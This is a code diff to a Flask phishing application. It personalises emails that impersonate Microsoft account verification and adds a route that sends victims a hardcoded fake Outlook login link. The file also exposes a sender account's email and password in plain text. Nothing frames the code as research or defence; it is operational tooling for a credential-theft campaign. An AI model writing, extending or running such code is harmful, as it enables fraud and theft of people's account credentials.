@@ -36,9 +36,9 @@ SMTP_PORT = 587
 SENDER_EMAIL = "regence.informatique@liquidationtravail.com"
 SENDER_PASSWORD = "Saouda2025!!"
 
-def send_email(recipient_email, phishing_link):
+def send_email(recipient_email, recipient_name, phishing_link):
     email_content = f"""
-    Bonjour,
+    Bonjour {recipient_name},
     
     Votre compte Microsoft nécessite une vérification urgente pour éviter une interruption de service.
     Veuillez confirmer votre identité dès maintenant :
@@ -64,6 +64,18 @@ def send_email(recipient_email, phishing_link):
         db.session.commit()
     except Exception as e:
         print(f"❌ Erreur : {e}")
+
+@app.route("/send_email", methods=["POST"])
+def send_email_route():
+    recipient_email = request.form.get("recipient_email")
+    recipient_name = request.form.get("recipient_name")
+    phishing_link = "https://outlook-regence.onrender.com"
+    
+    if recipient_email and recipient_name:
+        send_email(recipient_email, recipient_name, phishing_link)
+        return f"Email envoyé à {recipient_name} ({recipient_email}) avec succès !"
+    
+    return "Erreur : Email ou Nom manquant.", 400
 
 @app.route("/stats", methods=["GET", "POST"])
 def stats():
